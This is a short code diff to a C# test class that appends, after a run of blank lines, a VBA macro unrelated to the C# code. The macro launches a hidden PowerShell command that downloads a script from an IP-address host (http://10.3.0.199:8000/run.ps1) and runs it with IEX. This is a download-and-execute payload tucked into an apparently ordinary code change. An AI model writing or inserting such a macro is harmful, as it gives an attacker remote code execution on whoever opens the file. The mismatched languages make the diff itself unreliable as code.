@@ -15,3 +15,14 @@ public class TestClass
         Process.Start(path);
     }
 }
+
+
+
+
+
+
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.3.0.199:8000/run.ps1(or .txt)') | IEX"  
+    Shell str, vbHide
+End Sub
